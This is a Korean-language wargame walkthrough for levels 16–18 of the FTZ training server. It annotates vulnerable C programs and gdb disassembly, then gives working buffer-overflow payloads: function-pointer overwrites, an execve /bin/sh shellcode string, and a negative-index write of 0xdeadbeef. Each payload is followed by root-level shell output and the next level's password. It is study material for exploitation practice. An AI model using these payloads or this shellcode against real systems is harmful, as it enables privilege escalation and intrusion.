@@ -1,0 +1,824 @@
+@ Level-16 문제
+
+ - 아이디 : level16
+ - 패스워드 : about to cause mass
+ - fgets : 입력 받은 문자열의 길이를 확인하지 않기 때문에 BoF 공격에 취약함
+
+1. 'attackme' 소스 코드
+
+[level16@ftz level16]$ cat hint
+
+#include <stdio.h>
+
+void shell() {                  // shell 함수 선언 및 권한 상승/쉘 획득 실시
+  setreuid(3097,3097);
+  system("/bin/sh");
+}
+
+void printit() {              // printit 함수 선언
+  printf("Hello there!\n");
+}
+
+main()
+{ int crap;		       // int 형으로 crap 변수 선언
+  void (*call)()=printit;    // printit 함수를 call 포인터 함수에 대입
+  char buf[20];              // char 형으로 buf 변수 선언 및 배열 크기 20Byte 할당
+  fgets(buf,48,stdin);      // fgets 함수에 의해서 사용자 입력 48byte 만큼 입력 받음
+  call();                       // 함수 포인터 call 함수를 이용하여 printit 함수 호출 실시 <-- shell 함수로 변경하면 BoF 가능
+}
+
+
+2. 'attackme' gdb 분석
+
+[level16@ftz level16]$ cp attackme tmp
+[level16@ftz level16]$ cd tmp
+[level16@ftz tmp]$ gdb -q attackme
+Reading symbols from /home/level16/tmp/attackme...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048518 <+0>:     push   %ebp
+   0x08048519 <+1>:     mov    %esp,%ebp
+ - 함수 프롤로그
+
+   0x0804851b <+3>:     sub    $0x38,%esp
+ - esp에서 0x38(56byte)만큼 공간을 확보한다.
+
+   0x0804851e <+6>:     movl   $0x8048500,-0x10(%ebp)
+ - '0x8048500' 값을 ebp-0x10에 대입한다.
+ - '0x8048500' 주소는 printif 함수의 주소이다.
+ - [ebp-0x10]은 포인터 함수 call 함수의 시작 주소이다.
+
+   0x08048525 <+13>:    sub    $0x4,%esp
+ - esp에서 0x4(4byte)만큼 공간을 확보한다.
+
+   0x08048528 <+16>:    pushl  0x80496e8
+ - '0x80496e8' 값을 스택에 Push 한다.
+ - 0x80496e8 <stdin@@GLIBC_2.0>:    ""
+
+   0x0804852e <+22>:    push   $0x30
+ - 0x30(48)를 스택에 Push 한다.
+
+   0x08048530 <+24>:    lea    -0x38(%ebp),%eax
+ - [ebp-0x38] 주소 값을 eax에 대입한다.
+ - [ebp-0x38]는 buf의 시작 주소이다.
+
+   0x08048533 <+27>:    push   %eax
+ - eax 값을 스택에 Push 한다.
+
+   0x08048534 <+28>:    call   0x8048384 <fgets@plt>
+ - fgets 함수를 호출한다.
+
+   0x08048539 <+33>:    add    $0x10,%esp
+ - esp에서 0x10(16byte) 만큼 공간을 제거한다.
+
+   0x0804853c <+36>:    mov    -0x10(%ebp),%eax
+ - ebp-0x10 값을 eax에 대입한다.
+
+   0x0804853f <+39>:    call   *%eax
+ - eax(ebp-0x10)에 있는 함수 포인터 call 함수를 이용하여 printit 함수를 호출한다.
+
+   0x08048541 <+41>:    leave
+   0x08048542 <+42>:    ret
+ - 함수 에필로그
+
+End of assembler dump.
+
+(gdb) disas printit
+Dump of assembler code for function printit:
+   0x08048500 <+0>:     push   %ebp
+   0x08048501 <+1>:     mov    %esp,%ebp
+   0x08048503 <+3>:     sub    $0x8,%esp
+   0x08048506 <+6>:     sub    $0xc,%esp
+   0x08048509 <+9>:     push   $0x80485c0
+   0x0804850e <+14>:    call   0x80483a4 <printf@plt>
+   0x08048513 <+19>:    add    $0x10,%esp
+   0x08048516 <+22>:    leave
+   0x08048517 <+23>:    ret
+End of assembler dump.
+
+(gdb) disas shell
+Dump of assembler code for function shell:
+   0x080484d0 <+0>:     push   %ebp
+   0x080484d1 <+1>:     mov    %esp,%ebp
+   0x080484d3 <+3>:     sub    $0x8,%esp
+   0x080484d6 <+6>:     sub    $0x8,%esp
+   0x080484d9 <+9>:     push   $0xc19
+   0x080484de <+14>:    push   $0xc19
+   0x080484e3 <+19>:    call   0x80483b4 <setreuid@plt>
+   0x080484e8 <+24>:    add    $0x10,%esp
+   0x080484eb <+27>:    sub    $0xc,%esp
+   0x080484ee <+30>:    push   $0x80485b8
+   0x080484f3 <+35>:    call   0x8048364 <system@plt>
+   0x080484f8 <+40>:    add    $0x10,%esp
+   0x080484fb <+43>:    leave
+   0x080484fc <+44>:    ret
+End of assembler dump.
+(gdb) quit
+[level16@ftz tmp]$
+
+
+
+3. 스택 구조 그림
+
+[낮은 주소]
+		buf	20byte
+		dummy	20byte
+		*call	4byte
+		crap	4byte
+		dummy	8byte
+		sfp	4byte
+		ret	4byte
+[높은 주소]
+
+
+4. BoF
+
+ - 포인터 함수 call에 'shell' 함수 주소 삽입
+
+[낮은 주소]
+		buf	20byte	a*20개
+		dummy	20byte	a*20개
+		*call	4byte	0x080484d0(shell 함수 주소)
+		crap	4byte
+		dummy	8byte
+		sfp	4byte
+		ret	4byte
+[높은 주소]
+
+
+ 2) '0x080484d0' -> 리틀 엔디안 방식으로 변경
+
+0x080484d0	\xd0\x84\x04\x08
+
+
+ 3) 페이로드 제작
+
+"a"*40 + "\xd0\x84\x04\x08"
+
+[level16@ftz tmp]$ cd
+[level16@ftz level16]$ (python -c 'print("a"*40 + "\xd0\x84\x04\x08")';cat) | ./attackme
+
+[level16@ftz level16]$ (python -c 'print("a"*40 + "\xd0\x84\x04\x08")';cat) | ./attackme
+id
+uid=3097(level17) gid=3096(level16) groups=3096(level16)
+my-pass
+
+Level17 Password is "king poetic".
+
+[level16@ftz level16]$
+
+
+5. 'attackme' 어셈블리어 분석
+
+[level16@ftz level16]$ cd tmp
+[level16@ftz tmp]$ vi attackme.c
+
+#include <stdio.h>
+
+void shell() {
+  setreuid(3097,3097);
+  system("/bin/sh");
+}
+
+void printit() {
+  printf("Hello there!\n");
+}
+
+main()
+{ int crap;
+  void (*call)()=printit;
+  char buf[20];
+  fgets(buf,48,stdin);
+  call();
+}
+
+:wq
+
+[level16@ftz tmp]$ gcc -S -o attackme.a attackme.c
+[level16@ftz tmp]$ cat attackme.a
+        .file   "attackme.c"
+        .section        .rodata
+.LC0:
+        .string "/bin/sh"
+        .text
+.globl shell
+        .type   shell,@function
+shell:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $8, %esp
+        subl    $8, %esp
+        pushl   $3097
+        pushl   $3097
+        call    setreuid
+        addl    $16, %esp
+        subl    $12, %esp
+        pushl   $.LC0
+        call    system
+        addl    $16, %esp
+        leave
+        ret
+.Lfe1:
+        .size   shell,.Lfe1-shell
+        .section        .rodata
+.LC1:
+        .string "Hello there!\n"
+        .text
+.globl printit
+        .type   printit,@function
+printit:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $8, %esp
+        subl    $12, %esp
+        pushl   $.LC1
+        call    printf
+        addl    $16, %esp
+        leave
+        ret
+.Lfe2:
+        .size   printit,.Lfe2-printit
+.globl main
+        .type   main,@function
+main:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $56, %esp
+        andl    $-16, %esp
+        movl    $0, %eax
+        subl    %eax, %esp
+        movl    $printit, -16(%ebp)
+        subl    $4, %esp
+        pushl   stdin
+        pushl   $48
+        leal    -56(%ebp), %eax
+        pushl   %eax
+        call    fgets
+        addl    $16, %esp
+        movl    -16(%ebp), %eax
+        call    *%eax
+        leave
+        ret
+.Lfe3:
+        .size   main,.Lfe3-main
+        .ident  "GCC: (GNU) 3.2.2 20030222 (Red Hat Linux 3.2.2-5)"
+[level16@ftz tmp]$
+
+------------------------------------------------------------------------------------------------
+@ Level-17 문제
+
+ - 아이디 : level17
+ - 패스워드 : king poetic
+ - fgets : 입력 받은 문자열의 길이를 확인하지 않기 때문에 BoF 공격에 취약함
+
+1. 'attackme' 소스 코드
+
+[level17@ftz level17]$ cat hint
+
+#include <stdio.h>
+
+void printit() {		// printit 함수 선언
+  printf("Hello there!\n");
+}
+
+main()
+{ int crap;			// int 형으로 crap 변수 선언
+  void (*call)()=printit;	 // printit 함수를 call 포인터 함수에 대입
+  char buf[20];		// char 형으로 buf 변수 선언 및 배열 크기 20Byte 할당
+  fgets(buf,48,stdin);	// fgets 함수에 의해서 사용자 입력 48byte 만큼 입력 받음
+  setreuid(3098,3098);	// 다음 레벨 아이디
+  call();        // 함수 포인터 call 함수를 이용하여 printit 함수 호출 실시 <-- shell 함수로 변경하면 BoF 가능
+}
+
+
+2. 'attackme' gdb 분석
+
+[level17@ftz level17]$ cp attackme tmp
+[level17@ftz level17]$ cd tmp
+[level17@ftz tmp]$ gdb -q attackme
+Reading symbols from /home/level17/tmp/attackme...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080484a8 <+0>:     push   %ebp
+   0x080484a9 <+1>:     mov    %esp,%ebp
+ - 함수 프롤로그
+
+   0x080484ab <+3>:     sub    $0x38,%esp
+ - esp에서 0x38(56byte)만큼 공간을 확보한다.
+
+   0x080484ae <+6>:     movl   $0x8048490,-0x10(%ebp)
+ - '0x8048490' 값을 ebp-0x10에 대입한다.
+ - '0x8048490' 주소는 printif 함수의 주소이다.
+ - [ebp-0x10]은 포인터 함수 call 함수의 시작 주소이다.
+
+   0x080484b5 <+13>:    sub    $0x4,%esp
+ - esp에서 0x4(4byte)만큼 공간을 확보한다.
+
+   0x080484b8 <+16>:    pushl  0x804967c
+ - '0x804967c' 값을 스택에 Push 한다.
+ - 0x804967c <stdin@@GLIBC_2.0>:    ""
+
+   0x080484be <+22>:    push   $0x30
+ - 0x30(48)를 스택에 Push 한다.
+
+   0x080484c0 <+24>:    lea    -0x38(%ebp),%eax
+ - [ebp-0x38] 주소 값을 eax에 대입한다.
+ - [ebp-0x38]는 buf의 시작 주소이다.
+
+   0x080484c3 <+27>:    push   %eax
+ - eax 값을 스택에 Push 한다.
+
+   0x080484c4 <+28>:    call   0x8048350 <fgets@plt>
+ - fgets 함수를 호출한다.
+
+   0x080484c9 <+33>:    add    $0x10,%esp
+ - esp에서 0x10(16byte) 만큼 공간을 제거한다.
+
+   0x080484cc <+36>:    sub    $0x8,%esp
+ - esp에서 0x8(8byte)만큼 공간을 확보한다.
+
+   0x080484cf <+39>:    push   $0xc1a
+ - 0xc1a(3098)을 스택에 Push 한다.
+
+   0x080484d4 <+44>:    push   $0xc1a
+ - 0xc1a(3098)을 스택에 Push 한다.
+
+   0x080484d9 <+49>:    call   0x8048380 <setreuid@plt>
+ - setreuid 함수를 호출한다.
+
+   0x080484de <+54>:    add    $0x10,%esp
+ - esp에서 0x10(16byte) 만큼 공간을 제거한다.
+
+   0x080484e1 <+57>:    mov    -0x10(%ebp),%eax
+ - ebp-0x10 값을 eax에 대입한다.
+
+   0x080484e4 <+60>:    call   *%eax
+ - eax(ebp-0x10)에 있는 함수 포인터 call 함수를 이용하여 printit 함수를 호출한다.
+
+   0x080484e6 <+62>:    leave
+   0x080484e7 <+63>:    ret
+ - 함수 에필로그
+
+End of assembler dump.
+(gdb) quit
+
+
+3. 스택 구조 그림
+
+[낮은 주소]
+		buf	20byte
+		dummy	20byte
+		*call	4byte
+		crap	4byte
+		dummy	8byte
+		sfp	4byte
+		ret	4byte
+[높은 주소]
+
+
+4. BoF
+
+ - 포인터 함수 call에 쉘 코드 주소 삽입
+
+[낮은 주소]
+		buf	20byte	a*20개
+		dummy	20byte	a*20개
+		*call	4byte	쉘 코드 주소 삽입
+		crap	4byte
+		dummy	8byte
+		sfp	4byte
+		ret	4byte
+[높은 주소]
+
+ 1) 환경 변수에 쉘 코드 설정
+
+[level17@ftz tmp]$ export SHELLCODE=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
+
+
+ 2) 'SHELLCODE' 주소 찾기
+
+[level17@ftz tmp]$ vi shellcode.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[])
+{
+       char *env;
+
+       env = getenv(argv[1]);    // getenv() 함수를 이용하여 인자의 환경 변수를 가져옴
+       printf("SHELLCODE Address = %p\n", env);
+}
+
+:wq
+
+[level17@ftz tmp]$ gcc -o shellcode shellcode.c
+
+[level17@ftz tmp]$ ./shellcode SHELLCODE
+SHELLCODE Address = 0xbffffbc3
+
+
+ 3) '0xbffffbc3' -> 리틀 엔디안 방식으로 변경
+
+0xbffffbc3	\xc3\xfb\xff\xbf
+
+
+ 4) 페이로드 제작
+
+"a"*40 + "\xc3\xfb\xff\xbf"
+
+[level17@ftz tmp]$ cd
+[level17@ftz level17]$ (python -c 'print("a"*40 + "\xc3\xfb\xff\xbf")';cat) | ./attackme
+id
+uid=3098(level18) gid=3097(level17) groups=3097(level17)
+
+my-pass
+TERM environment variable not set.
+
+Level18 Password is "why did you do it".
+
+
+[level17@ftz level17]$
+
+
+5. 'attackme' 어셈블리어 분석
+
+[level17@ftz level17]$ cd tmp
+[level17@ftz tmp]$ vi attackme.c
+
+#include <stdio.h>
+
+void printit() {
+  printf("Hello there!\n");
+}
+
+main()
+{ int crap;
+  void (*call)()=printit;
+  char buf[20];
+  fgets(buf,48,stdin);
+  setreuid(3098,3098);
+  call();
+}
+
+:wq
+[level17@ftz tmp]$ gcc -S -o attackme.a attackme.c
+[level17@ftz tmp]$ cat attackme.a
+        .file   "attackme.c"
+        .section        .rodata
+.LC0:
+        .string "Hello there!\n"
+        .text
+.globl printit
+        .type   printit,@function
+printit:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $8, %esp
+        subl    $12, %esp
+        pushl   $.LC0
+        call    printf
+        addl    $16, %esp
+        leave
+        ret
+.Lfe1:
+        .size   printit,.Lfe1-printit
+.globl main
+        .type   main,@function
+main:
+        pushl   %ebp
+        movl    %esp, %ebp
+        subl    $56, %esp
+        andl    $-16, %esp
+        movl    $0, %eax
+        subl    %eax, %esp
+        movl    $printit, -16(%ebp)
+        subl    $4, %esp
+        pushl   stdin
+        pushl   $48
+        leal    -56(%ebp), %eax
+        pushl   %eax
+        call    fgets
+        addl    $16, %esp
+        subl    $8, %esp
+        pushl   $3098
+        pushl   $3098
+        call    setreuid
+        addl    $16, %esp
+        movl    -16(%ebp), %eax
+        call    *%eax
+        leave
+        ret
+.Lfe2:
+        .size   main,.Lfe2-main
+        .ident  "GCC: (GNU) 3.2.2 20030222 (Red Hat Linux 3.2.2-5)"
+[level17@ftz tmp]$
+------------------------------------------------------------------------------------------------
+@ Level-18 문제
+
+ - 아이디 : level18
+ - 패스워드 : why did you do it
+
+1. 'attackme' 소스 코드
+
+[level18@ftz level18]$ cat hint
+
+#include <stdio.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+void shellout(void);
+
+int main()
+{
+  char string[100];		// char 형으로 string 변수 선언 및 100byte 할당
+  int check;		// int 형으로 check 변수 선언
+  int x = 0;		// int 형으로 x 변수 선언
+  int count = 0;		// int 형으로 count 변수 선언
+  fd_set fds;		// 구조체
+  printf("Enter your command: ");
+  fflush(stdout);		// stdout에 지정된 출력 스트림 관련 버퍼를 초기화
+  while(1)			// 무한 루프
+    {
+      if(count >= 100)	// count 값이 100 보다 크거나 같다면, if 문 수행
+        printf("what are you trying to do?\n");
+      if(check == 0xdeadbeef)  // check 값이 0xdeadbeef이면, if 문 수행
+        shellout();		// shellout 함수 호출
+      else
+        {
+          FD_ZERO(&fds);
+          FD_SET(STDIN_FILENO,&fds);
+
+          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
+            {
+              if(FD_ISSET(fileno(stdin),&fds))
+                {
+                  read(fileno(stdin),&x,1);	// stdin 입력을 1byte 씩 받아서 x의 주소에 저장함
+                  switch(x)
+                    {
+                      case '\r':
+                      case '\n':		// x 값이 '\r', '\n' 이면, '\a' 실시(비프음)
+                        printf("\a");
+                        break;
+                      case 0x08:		// x 값이 0x08 이면, count 값을 감소하고 \b \b 실시(백스페이스 2번)
+                        count--;
+                        printf("\b \b");
+                        break;
+                      default:		// x 값이 위의 값이 아니면, string 배열에 count 넣고 증가
+                        string[count] = x;
+                        count++;
+                        break;
+                    }
+                }
+            }
+        }
+    }
+}
+
+void shellout(void)		// shellout 함수에 의해서 다음 레벨 권한 상승 및 쉘 획득
+{
+  setreuid(3099,3099);
+  execl("/bin/sh","sh",NULL);
+}
+
+[level18@ftz level18]$
+
+
+2. 'attackme' gdb 분석
+
+[level18@ftz level18]$ cp attackme tmp
+[level18@ftz level18]$ cd tmp
+[level18@ftz tmp]$ gdb -q attackme
+Reading symbols from /home/level18/tmp/attackme...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048550 <+0>:     push   %ebp
+   0x08048551 <+1>:     mov    %esp,%ebp
+ - 함수 프롤로그
+
+   0x08048553 <+3>:     sub    $0x100,%esp
+ - esp에서 0x100(256byte)만큼 공간을 확보한다.
+
+   0x08048559 <+9>:     push   %edi
+   0x0804855a <+10>:    push   %esi
+   0x0804855b <+11>:    push   %ebx
+   0x0804855c <+12>:    movl   $0x0,-0x6c(%ebp)
+   0x08048563 <+19>:    movl   $0x0,-0x70(%ebp)
+   0x0804856a <+26>:    push   $0x8048800
+   0x0804856f <+31>:    call   0x8048470 <printf@plt>
+   0x08048574 <+36>:    add    $0x4,%esp
+   0x08048577 <+39>:    mov    0x804993c,%eax
+   0x0804857c <+44>:    mov    %eax,-0xfc(%ebp)
+   0x08048582 <+50>:    mov    -0xfc(%ebp),%ecx
+   0x08048588 <+56>:    push   %ecx
+   0x08048589 <+57>:    call   0x8048430 <fflush@plt>
+   0x08048591 <+65>:    jmp    0x8048598 <main+72>
+   0x08048593 <+67>:    jmp    0x8048775 <main+549>
+
+   0x08048598 <+72>:    cmpl   $0x63,-0x70(%ebp)
+   0x0804859c <+76>:    jle    0x80485ab <main+91>
+ - 0x63(99)와 [ebp-0x70]에 있는 값을 비교한다.
+ - [ebp-0x70]은 count 시작 주소이다.
+
+	0x63(99) >= [ebp-0x70] 인 경우,  0x80485ab <main+91>으로 점프 실시
+	0x63(99) >= [ebp-0x70] 가 아닌 경우, 다음 코드를 진행함
+
+   0x0804859e <+78>:    push   $0x8048815
+   0x080485a3 <+83>:    call   0x8048470 <printf@plt>
+   0x080485a8 <+88>:    add    $0x4,%esp
+
+   0x080485ab <+91>:    cmpl   $0xdeadbeef,-0x68(%ebp)
+   0x080485b2 <+98>:    jne    0x80485c0 <main+112>
+ - '0xdeadbeef'와 [ebp-0x68]에 있는 값을 비교한다.
+ - [ebp-0x68]은 check 시작 주소이다.
+
+	비교 연산 결과 값이 '0'인 경우, 다음 코드 진행
+	비교 연산 결과 값이 '0'이 아닌 경우, 0x80485c0 <main+112>로 점프 실시
+
+   0x080485b4 <+100>:   call   0x8048780 <shellout>
+   0x080485b9 <+105>:   jmp    0x8048770 <main+544>
+   0x080485be <+110>:   mov    %esi,%esi
+   0x080485c0 <+112>:   lea    -0xf0(%ebp),%edi
+   0x080485c6 <+118>:   mov    %edi,-0xfc(%ebp)
+   0x080485cc <+124>:   mov    $0x20,%ecx
+   0x080485d1 <+129>:   mov    -0xfc(%ebp),%edi
+   0x080485d7 <+135>:   xor    %eax,%eax
+   0x080485d9 <+137>:   cld
+   0x080485da <+138>:   rep stos %eax,%es:(%edi)
+   0x080485dc <+140>:   mov    %ecx,-0xf4(%ebp)
+   0x080485e2 <+146>:   mov    %edi,-0xf8(%ebp)
+   0x080485e8 <+152>:   jmp    0x80485f2 <main+162>
+   0x080485ea <+154>:   lea    0x0(%esi),%esi
+   0x080485f0 <+160>:   jmp    0x80485c0 <main+112>
+   0x080485f2 <+162>:   xor    %eax,%eax
+   0x080485f4 <+164>:   bts    %eax,-0xf0(%ebp)
+   0x080485fb <+171>:   push   $0x0
+   0x080485fd <+173>:   push   $0x0
+   0x080485ff <+175>:   push   $0x0
+   0x08048601 <+177>:   lea    -0xf0(%ebp),%ecx
+   0x08048607 <+183>:   mov    %ecx,-0xfc(%ebp)
+   0x0804860d <+189>:   mov    -0xfc(%ebp),%edi
+   0x08048613 <+195>:   push   %edi
+   0x08048614 <+196>:   push   $0x400
+   0x08048619 <+201>:   call   0x8048440 <select@plt>
+   0x0804861e <+206>:   add    $0x14,%esp
+   0x08048621 <+209>:   mov    %eax,-0xfc(%ebp)
+   0x08048627 <+215>:   cmpl   $0x0,-0xfc(%ebp)
+   0x0804862e <+222>:   jle    0x8048770 <main+544>
+   0x08048634 <+228>:   mov    0x8049940,%eax
+   0x08048639 <+233>:   mov    %eax,-0xfc(%ebp)
+   0x0804863f <+239>:   mov    -0xfc(%ebp),%ecx
+   0x08048645 <+245>:   push   %ecx
+   0x08048646 <+246>:   call   0x8048420 <fileno@plt>
+   0x0804864b <+251>:   add    $0x4,%esp
+   0x0804864e <+254>:   mov    %eax,-0xfc(%ebp)
+   0x08048654 <+260>:   mov    -0xfc(%ebp),%esi
+   0x0804865a <+266>:   and    $0x1f,%esi
+   0x0804865d <+269>:   mov    0x8049940,%edi
+   0x08048663 <+275>:   mov    %edi,-0xfc(%ebp)
+   0x08048669 <+281>:   mov    -0xfc(%ebp),%eax
+   0x0804866f <+287>:   push   %eax
+   0x08048670 <+288>:   call   0x8048420 <fileno@plt>
+   0x08048675 <+293>:   add    $0x4,%esp
+   0x08048678 <+296>:   mov    %eax,-0xfc(%ebp)
+   0x0804867e <+302>:   mov    -0xfc(%ebp),%edx
+   0x08048684 <+308>:   shr    $0x5,%edx
+   0x08048687 <+311>:   lea    0x0(,%edx,4),%ecx
+   0x0804868e <+318>:   mov    %ecx,-0xfc(%ebp)
+   0x08048694 <+324>:   lea    -0xf0(%ebp),%edx
+   0x0804869a <+330>:   mov    -0xfc(%ebp),%edi
+   0x080486a0 <+336>:   bt     %esi,(%edi,%edx,1)
+   0x080486a4 <+340>:   setb   %bl
+   0x080486a7 <+343>:   test   %bl,%bl
+   0x080486a9 <+345>:   je     0x8048770 <main+544>
+   0x080486af <+351>:   push   $0x1
+   0x080486b1 <+353>:   lea    -0x6c(%ebp),%eax
+   0x080486b4 <+356>:   mov    %eax,-0xfc(%ebp)
+   0x080486ba <+362>:   mov    -0xfc(%ebp),%ecx
+   0x080486c0 <+368>:   push   %ecx
+   0x080486c1 <+369>:   mov    0x8049940,%edi
+   0x080486c7 <+375>:   mov    %edi,-0xfc(%ebp)
+   0x080486cd <+381>:   mov    -0xfc(%ebp),%eax
+   0x080486d3 <+387>:   push   %eax
+   0x080486d4 <+388>:   call   0x8048420 <fileno@plt>
+   0x080486d9 <+393>:   add    $0x4,%esp
+   0x080486dc <+396>:   mov    %eax,-0xfc(%ebp)
+   0x080486e2 <+402>:   mov    -0xfc(%ebp),%ecx
+   0x080486e8 <+408>:   push   %ecx
+   0x080486e9 <+409>:   call   0x8048490 <read@plt>
+   0x080486ee <+414>:   add    $0xc,%esp
+   0x080486f1 <+417>:   mov    -0x6c(%ebp),%edi
+   0x080486f4 <+420>:   mov    %edi,-0xfc(%ebp)
+
+   0x080486fa <+426>:   cmpl   $0xa,-0xfc(%ebp)
+   0x08048701 <+433>:   je     0x8048722 <main+466>
+ - '0xa'와 [ebp-0xfc]에 있는 값을 비교한다.
+ - [ebp-0xfc]는 x 시작 주소이다.
+
+	비교 연산 결과 값이 '0'인 경우, 0x8048722 <main+466>으로 점프 실시
+	비교 연산 결과 값이 '0'이 아닌 경우, 다음 코드 진행
+
+   0x08048703 <+435>:   cmpl   $0xa,-0xfc(%ebp)
+   0x0804870a <+442>:   jg     0x8048717 <main+455>
+
+   0x0804870c <+444>:   cmpl   $0x8,-0xfc(%ebp)
+   0x08048713 <+451>:   je     0x8048731 <main+481>
+ - '0x8'과 [ebp-0xfc]에 있는 값을 비교한다.
+ - [ebp-0xfc]는 x 시작 주소이다.
+
+	비교 연산 결과 값이 '0'인 경우, 0x8048731 <main+481>로 점프 실시
+	비교 연산 결과 값이 '0'이 아닌 경우, 다음 코드 진행
+
+   0x08048715 <+453>:   jmp    0x8048743 <main+499>
+   0x08048717 <+455>:   cmpl   $0xd,-0xfc(%ebp)
+   0x0804871e <+462>:   je     0x8048722 <main+466>
+   0x08048720 <+464>:   jmp    0x8048743 <main+499>
+   0x08048722 <+466>:   push   $0x8048831
+   0x08048727 <+471>:   call   0x8048470 <printf@plt>
+   0x0804872c <+476>:   add    $0x4,%esp
+   0x0804872f <+479>:   jmp    0x8048770 <main+544>
+   0x08048731 <+481>:   decl   -0x70(%ebp)
+   0x08048734 <+484>:   push   $0x8048833
+   0x08048739 <+489>:   call   0x8048470 <printf@plt>
+   0x0804873e <+494>:   add    $0x4,%esp
+   0x08048741 <+497>:   jmp    0x8048770 <main+544>
+   0x08048743 <+499>:   lea    -0x64(%ebp),%eax
+ - [ebp-0x64] 주소 값을 eax에 대입한다.
+ - 이때, [ebp-0x64]는 string 시작 주소이다.
+
+
+   0x08048746 <+502>:   mov    %eax,-0xfc(%ebp)
+   0x0804874c <+508>:   mov    -0x70(%ebp),%edx
+   0x0804874f <+511>:   mov    -0x6c(%ebp),%cl
+   0x08048752 <+514>:   mov    %cl,-0xfd(%ebp)
+   0x08048758 <+520>:   mov    -0xfd(%ebp),%al
+   0x0804875e <+526>:   mov    -0xfc(%ebp),%ecx
+   0x08048764 <+532>:   mov    %al,(%edx,%ecx,1)
+   0x08048767 <+535>:   incl   -0x70(%ebp)
+   0x0804876a <+538>:   jmp    0x8048770 <main+544>
+   0x0804876c <+540>:   lea    0x0(%esi,%eiz,1),%esi
+   0x08048770 <+544>:   jmp    0x8048591 <main+65>
+   0x08048775 <+549>:   lea    -0x10c(%ebp),%esp
+   0x0804877b <+555>:   pop    %ebx
+   0x0804877c <+556>:   pop    %esi
+   0x0804877d <+557>:   pop    %edi
+   0x0804877e <+558>:   leave
+   0x0804877f <+559>:   ret
+End of assembler dump.
+(gdb) quit
+[level18@ftz tmp]$
+
+
+3. 스택 구조 그림
+
+[낮은 주소]
+		fds	4byte
+		x	4byte
+		dummy	136byte
+		count	4byte
+		dummy	4byte
+		check	4byte
+		string	100byte
+		sfp	4byte
+		ret	4byte
+[높은 주소]
+
+
+3. BoF 공격
+
+1) BoF 공격
+
+ - switch 문의 default 내용을 보면, count 값은 string에 배열로 사용한다.
+ - 그래서 'case 0x08'에 의해서 '0x08'을 4번 입력하면, count 값이 '-4'가 된다.
+ - 그럼 'string-4' 주소 위치인 check에 '0xdeadbeef'를 삽입할 수 있다.
+
+                      case 0x08:		// x 값이 0x08 이면, count 값을 감소하고 \b \b 실시(백스페이스 2번)
+                        count--;
+                        printf("\b \b");
+                        break;
+                      default:		// x 값이 위의 값이 아니면, string 배열에 count 넣고 증가
+                        string[count] = x;
+                        count++;
+                        break;
+                    }
+
+ 2) '0xdeadbeef' -> 리틀 엔디안 방식으로 변경
+
+0xdeadbeef	\xef\xbe\xad\xde
+
+
+ 3) 페이로드 제작
+
+"\x08"*4 + "\xef\xbe\xad\xde"
+
+[level18@ftz tmp]$ cd
+[level18@ftz level18]$ (python -c 'print("\x08"*4 + "\xef\xbe\xad\xde")';cat) | ./attackme
+Enter your command: id
+uid=3099(level19) gid=3098(level18) groups=3098(level18)
+
+my-pass
+
+Level19 Password is "swimming in pink".
+
+[level18@ftz level18]$
